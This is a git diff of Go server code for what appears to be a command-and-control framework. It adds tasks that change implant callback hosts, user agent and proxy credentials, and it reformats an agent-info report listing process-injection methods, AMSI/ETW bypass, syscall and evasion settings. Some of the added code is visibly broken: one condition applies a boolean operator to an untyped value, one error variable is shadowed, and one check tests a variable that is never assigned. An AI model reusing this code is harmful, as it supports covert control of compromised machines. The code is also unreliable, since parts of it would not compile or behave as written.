@@ -1471,6 +1471,110 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_PPID, int(pid)}
 
+		case "callback.http.host":
+			actionId, ok := args["action"].(string)
+			if !ok {
+				err = errors.New("parameter 'action' must be set")
+				goto RET
+			}
+
+			callbackAddr, ok := args["callback_host"].(string)
+			if !ok {
+				err = errors.New("parameter 'callback_host' must be set")
+				goto RET
+			}
+
+			callbackHost := ""
+			callbackPort := 0
+
+			if !strings.Contains(callbackAddr, ":") {
+				err = errors.New("callback_host must be in format 'host:port'")
+				goto RET
+			}
+
+			parts := strings.Split(callbackAddr, ":")
+			if len(parts) != 2 {
+				err = errors.New("callback_host must be in format 'host:port'")
+				goto RET
+			}
+
+			callbackHost = strings.TrimSpace(parts[0])
+			portStr := strings.TrimSpace(parts[1])
+
+			if callbackHost == "" {
+				err = errors.New("host cannot be empty")
+				goto RET
+			}
+
+			port, err := strconv.Atoi(portStr)
+			if err != nil {
+				err = errors.New("port must be a valid number")
+				goto RET
+			}
+
+			if port < 1 || port > 65535 {
+				err = errors.New("port must be between 1 and 65535")
+				goto RET
+			}
+			callbackPort = port
+
+			if strings.Contains(callbackHost, " ") {
+				err = errors.New("host cannot contain spaces")
+				goto RET
+			}
+
+			if strings.HasPrefix(callbackHost, "[") && strings.HasSuffix(callbackHost, "]") {
+				ipv6 := callbackHost[1 : len(callbackHost)-1]
+				if ipv6 == "" {
+					err = errors.New("IPv6 address cannot be empty")
+					goto RET
+				}
+			} else {
+				if len(callbackHost) > 255 {
+					err = errors.New("hostname too long")
+					goto RET
+				}
+			}
+
+			action_n := 0
+
+			if actionId == "add" {
+				action_n = 0x10
+			} else if actionId == "rm" {
+				action_n = 0x20
+			} else {
+				err = errors.New("Unknown 'action'. Use 'add' or 'rm'")
+				goto RET
+			}
+
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_CALLBACK, int(action_n), callbackHost, callbackPort}
+		
+		case "callback.http.useragent":
+			useragent, ok := args["useragent"].(string)
+			if !ok {
+				err = errors.New("parameter 'useragent' must be set")
+				goto RET
+			}
+
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_UA, useragent}
+
+		case "callback.http.proxy":
+			proxyEnabled, ok := args["proxy_enabled"]
+			if !ok {
+				err = errors.New("parameter 'proxy_enabled' must be set")
+				goto RET
+			}
+
+			proxyUrl, ok := args["proxy_url"]
+			if !ok && proxyEnabled {
+				err = errors.New("parameter 'proxy_enabled' must be set")
+				goto RET
+			}
+
+			proxyUsername := args["username"]
+			proxyPassword := args["password"]
+
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_CB_PROXY, proxyEnabled, proxyUrl, proxyUsername, proxyPassword}
 		case "killdate.date":
 			dt, ok := args["date"].(string)
 			if !ok {
@@ -1628,26 +1732,23 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_ALLOC, int(alloc_n)}
 			}
 		case "inject.write":
-			{
-				write, ok := args["write"].(string)
-				if !ok {
-					err = errors.New("parameter 'write' must be set")
-					goto RET
-				}
-
-				write_n := 0
-				if write == "apc" {
-					write_n = 1
-				} else if write == "standard" {
-					write_n = 0
-				} else {
-					err = errors.New("Unknonw write type. Type must be 'apc' or 'standard")
-					goto RET
-				}
-
-				array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_WRITE, int(write_n)}
+			write, ok := args["write"].(string)
+			if !ok {
+				err = errors.New("parameter 'write' must be set")
+				goto RET
 			}
-		
+
+			write_n := 0
+			if write == "apc" {
+				write_n = 1
+			} else if write == "standard" {
+				write_n = 0
+			} else {
+				err = errors.New("Unknonw write type. Type must be 'apc' or 'standard")
+				goto RET
+			}
+
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_INJ_WRITE, int(write_n)}
 		case "syscall": 
 			syscall, ok := args["syscall"].(string)
 			if !ok {
@@ -1668,7 +1769,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			}
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_SYSCALL, int(syscall_n)}
-		case "pipe_name_fork": {
+		case "fork_pipe_name": {
 			forkPipeName := args["name"].(string)
 			if !ok {
 				err = errors.New("parameter 'name' must be set")
@@ -2331,24 +2432,24 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					task.Message = "The agent has completed its work"
 					_ = ts.TsAgentTerminate(agentData.Id, task.TaskId)
 
-case TASK_GETINFO:
+				case TASK_GETINFO:
 
 					// session info
 					sleep_time := int(cmd_packer.ParseInt32())
 					jitter_time := int(cmd_packer.ParseInt32())
 
 					mask_tech_id := int(cmd_packer.ParseInt32())
-					heap_obf := cmd_packer.ParseInt32()
+					heap_obf := uint32(cmd_packer.ParseInt32())
 					jmp_gadget := cmd_packer.ParseInt64()
 					ntcont_gadget := cmd_packer.ParseInt64()
 
-					bof_hook := cmd_packer.ParseInt32()
+					bof_hook := uint32(cmd_packer.ParseInt32())
 					syscall := int(cmd_packer.ParseInt32())
 					amsietwbp := int(cmd_packer.ParseInt32())
 
-					block_dlls := cmd_packer.ParseInt32()
+					block_dlls := uint32(cmd_packer.ParseInt32())
 					parent_pid := int(cmd_packer.ParseInt32())
-					use_pipe := cmd_packer.ParseInt32()
+					use_pipe := uint32(cmd_packer.ParseInt32())
 
 					fork_pipe_name := cmd_packer.ParseString()
 					fork_spawn_to := cmd_packer.ParseString()
@@ -2360,7 +2461,7 @@ case TASK_GETINFO:
 					process_id := int(cmd_packer.ParseInt32())
 					thread_id := int(cmd_packer.ParseInt32())
 					parent_id := int(cmd_packer.ParseInt32())
-					elevated := cmd_packer.ParseInt32()
+					elevated := uint32(cmd_packer.ParseInt32())
 					h_heap := cmd_packer.ParseInt64()
 					proc_arch := int(cmd_packer.ParseInt32())
 					kh_start := cmd_packer.ParseInt64()
@@ -2374,18 +2475,18 @@ case TASK_GETINFO:
 					os_minor := cmd_packer.ParseInt32()
 					os_build := cmd_packer.ParseInt32()
 
-					killdate_use := cmd_packer.ParseInt32()
-					killdate_sdel := cmd_packer.ParseInt32()
-					killdate_proc := cmd_packer.ParseInt32()
+					killdate_use := uint32(cmd_packer.ParseInt32())
+					killdate_sdel := uint32(cmd_packer.ParseInt32())
+					killdate_proc := uint32(cmd_packer.ParseInt32())
 					killdate_day := cmd_packer.ParseInt32()
 					killdate_mont := cmd_packer.ParseInt32()
 					killdate_year := cmd_packer.ParseInt32()
 
-					injection_alloc := cmd_packer.ParseInt32()
-					injection_write := cmd_packer.ParseInt32()
+					injection_alloc := int(cmd_packer.ParseInt32())
+					injection_write := int(cmd_packer.ParseInt32())
 
 					// transport
-					profileC2 := cmd_packer.ParseInt32()
+					profileC2 := int32(cmd_packer.ParseInt32())
 
 					webHostQtt := cmd_packer.ParseInt32()
 					webPortQtt := cmd_packer.ParseInt32()
@@ -2394,13 +2495,12 @@ case TASK_GETINFO:
 					webMethod := cmd_packer.ParseString()
 					webUseragt := cmd_packer.ParseString()
 					webHeaders := cmd_packer.ParseString()
-					webSecure := cmd_packer.ParseInt32()
-					webProxyEbl := cmd_packer.ParseInt32()
+					webSecure := uint32(cmd_packer.ParseInt32())
+					webProxyEbl := uint32(cmd_packer.ParseInt32())
 					webProxyUrl := cmd_packer.ParseString()
 					webProxyUser := cmd_packer.ParseString()
 					webProxyPass := cmd_packer.ParseString()
 					
-					// Corrigindo a declaração dos slices
 					webHostList := make([]string, webHostQtt)
 					webPortList := make([]string, webPortQtt)
 					webEndpList := make([]string, webEndpQtt)
@@ -2428,22 +2528,27 @@ case TASK_GETINFO:
 						}
 					}
 
-					injectAllocStr := func(id int) string {
-						switch id {
-						case 0x00:
-							return "standard"
-						case 0x01:
-							return "Drip"
+					getFilenameFromPath := func(path string) string {
+						if path == "" {
+							return "Unknown"
 						}
-					}
-
-					injectWriteStr := func(id int) string {
-						switch id {
-						case 0x00: 
-							return "standard"
-						case 0x01:
-							return "APC"
+						
+						normalizedPath := strings.ReplaceAll(path, "\\", "/")
+						
+						lastSlash := strings.LastIndex(normalizedPath, "/")
+						if lastSlash == -1 {
+							return path
 						}
+						
+						filename := normalizedPath[lastSlash+1:]
+						
+						filename = strings.TrimSpace(filename)
+						
+						if filename == "" {
+							return "Unknown"
+						}
+						
+						return filename
 					}
 
 					amsietwbpStr := func(id int) string {
@@ -2474,6 +2579,28 @@ case TASK_GETINFO:
 						}
 					}
 
+					injectWriteStr := func(id int) string {
+						switch id {
+						case 0:
+							return "Standard"
+						case 1:
+							return "APC"
+						default:
+							return fmt.Sprintf("%d", id)
+						}
+					}
+
+					injectAllocStr := func(id int) string {
+						switch id {
+						case 0:
+							return "Standard"
+						case 1:
+							return "Drip"
+						default:
+							return fmt.Sprintf("%d", id)
+						}
+					}
+
 					boolStr := func(b uint32) string {
 						if b != 0 {
 							return "True"
@@ -2494,7 +2621,97 @@ case TASK_GETINFO:
 						}
 					}
 
-					// Formatting dates and versions
+					// Format callback hosts with ports - CORRIGIDO
+					formatCallbackHosts := func(hosts []string, ports []string) string {
+						if len(hosts) == 0 || len(ports) == 0 {
+							return "None"
+						}
+						
+						var pairs []string
+						for i := 0; i < len(hosts) && i < len(ports); i++ {
+							if hosts[i] != "" && ports[i] != "" {
+								pairs = append(pairs, fmt.Sprintf("%s:%s", hosts[i], ports[i]))
+							}
+						}
+						
+						if len(pairs) == 0 {
+							return "None"
+						}
+						return strings.Join(pairs, ", ")
+					}
+
+					// Format headers para aparecer completo com lista - CORRIGIDO
+					formatHeaders := func(headers string) string {
+						if headers == "" {
+							return "None"
+						}
+						
+						// Split headers por newlines e limpa espaços
+						headerLines := strings.Split(headers, "\n")
+						var cleanHeaders []string
+						
+						for _, h := range headerLines {
+							h = strings.TrimSpace(h)
+							h = strings.ReplaceAll(h, "\r", "")
+							if h != "" {
+								cleanHeaders = append(cleanHeaders, h)
+							}
+						}
+						
+						if len(cleanHeaders) == 0 {
+							return "None"
+						}
+						
+						result := "[" + strings.Join(cleanHeaders, ", ") + "]"
+						
+						if len(result) > 85 {
+							var formatted strings.Builder
+							formatted.WriteString("[")
+							for i, h := range cleanHeaders {
+								if i > 0 {
+									formatted.WriteString(", ")
+								}
+								if formatted.Len()+len(h) > 85 && i > 0 {
+									// formatted.WriteString("\n")
+									
+									formatted.WriteString(" ")
+								}
+								formatted.WriteString(h)
+							}
+							formatted.WriteString("]")
+							return formatted.String()
+						}
+						
+						return result
+					}
+
+					formatEndpoints := func(endpoints []string) string {
+						if len(endpoints) == 0 {
+							return "None"
+						}
+						
+						result := "[" + strings.Join(endpoints, ", ") + "]"
+						
+						if len(result) > 85 {
+							var formatted strings.Builder
+							formatted.WriteString("[")
+							for i, endpoint := range endpoints {
+								if i > 0 {
+									formatted.WriteString(", ")
+								}
+								if formatted.Len()+len(endpoint) > 85 && i > 0 {
+									// formatted.WriteString("\n")
+									formatted.WriteString(" ")
+								}
+								formatted.WriteString(endpoint)
+							}
+							formatted.WriteString("]")
+							return formatted.String()
+						}
+						
+						return result
+					}
+
 					killdateStr := fmt.Sprintf("%02d/%02d/%04d", killdate_day, killdate_mont, killdate_year)
 					osVersionStr := fmt.Sprintf("%d.%d.%d", os_major, os_minor, os_build)
 
@@ -2530,13 +2747,13 @@ case TASK_GETINFO:
 					b.WriteString(border)
 
 					// INJECTION
-					b.WriteString(row("INJECTION", "Allocation Method", fmt.Sprintf("%s", injectAllocStr(injection_alloc))))
-					b.WriteString(row("", "Write Method", fmt.Sprintf("%s", injectWriteStr(injection_write))))
+					b.WriteString(row("INJECTION", "Allocation Method", injectAllocStr(injection_alloc)))
+					b.WriteString(row("", "Write Method", injectWriteStr(injection_write)))
 					b.WriteString(border)
 
 					// SESSION
 					b.WriteString(row("SESSION", "Agent ID", agent_id))
-					b.WriteString(row("", "Image Name", img_name))
+					b.WriteString(row("", "Image Name", getFilenameFromPath(img_path)))
 					b.WriteString(row("", "Image Path", img_path))
 					b.WriteString(row("", "Command Line", cmd_line))
 					b.WriteString(row("", "Process ID", fmt.Sprintf("%d", process_id)))
@@ -2573,35 +2790,16 @@ case TASK_GETINFO:
 
 					// WEB PROFILE
 					b.WriteString(row("WEB PROFILE", "Profile Type", profileTypeStr(profileC2)))
+					b.WriteString(row("", "Callback Hosts", formatCallbackHosts(webHostList, webPortList)))
+					b.WriteString(row("", "Endpoints", formatEndpoints(webEndpList)))
 					b.WriteString(row("", "Method", webMethod))
 					b.WriteString(row("", "User Agent", webUseragt))
-					b.WriteString(row("", "Headers", webHeaders))
+					b.WriteString(row("", "Headers", formatHeaders(webHeaders)))
 					b.WriteString(row("", "SSL/TLS", boolStr(webSecure)))
 					b.WriteString(row("", "Proxy Enabled", boolStr(webProxyEbl)))
 					b.WriteString(row("", "Proxy URL", webProxyUrl))
-					b.WriteString(row("", "Proxy User", webProxyUser))
-					b.WriteString(row("", "Proxy Pass", webProxyPass ))
-					
-					// Hosts and Ports
-					for i := 0; i < int(webHostQtt); i++ {
-						hostLabel := "Host"
-						portLabel := "Port"
-						if i > 0 {
-							hostLabel = fmt.Sprintf("Host %d", i+1)
-							portLabel = fmt.Sprintf("Port %d", i+1)
-						}
-						b.WriteString(row("", hostLabel, webHostList[i]))
-						b.WriteString(row("", portLabel, webPortList[i]))
-					}
-					
-					// Endpoints
-					for i := 0; i < int(webEndpQtt); i++ {
-						endpointLabel := "Endpoint"
-						if i > 0 {
-							endpointLabel = fmt.Sprintf("Endpoint %d", i+1)
-						}
-						b.WriteString(row("", endpointLabel, webEndpList[i]))
-					}
+					b.WriteString(row("", "Proxy Username", webProxyUser))
+					b.WriteString(row("", "Proxy Password", webProxyPass))
 					
 					b.WriteString(border)
 
